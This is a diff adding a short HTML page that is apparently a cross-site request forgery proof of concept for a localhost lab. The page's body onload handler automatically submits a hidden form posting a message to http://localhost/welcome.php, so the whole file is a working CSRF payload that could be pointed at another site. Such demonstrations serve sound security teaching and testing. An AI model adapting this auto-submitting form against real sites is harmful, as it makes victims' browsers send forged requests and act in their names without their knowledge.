@@ -1,0 +1,15 @@
+﻿<!DOCTYPE html>
+
+<html lang="en" xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+</head>
+<body onload="document.createElement('form').submit.call(document.welcome)">
+    <form name="welcome" action="http://localhost/welcome.php" method="post">
+            <input type="hidden" name="name" value="CSRF was successful." required />
+            <br />
+            <input type="hidden" name="submit" value="Let's go!" />
+    </form>
+</body>
+</html>
